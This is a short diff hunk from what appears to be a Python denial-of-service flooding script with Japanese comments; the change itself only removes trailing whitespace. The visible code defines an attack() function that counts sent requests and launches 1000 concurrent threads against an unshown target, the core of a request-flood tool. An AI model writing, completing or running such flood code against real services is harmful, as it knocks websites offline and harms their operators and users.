@@ -14,7 +14,7 @@ def attack():
             print(f"{COUNT}回リクエスト送信")
         except Exception as e:
             print(f"エラー: {e}")
-            
+
 THREADS=1000#スレッド数同時接続
 for _ in range(THREADS):
     t = threading.Thread(target=attack)
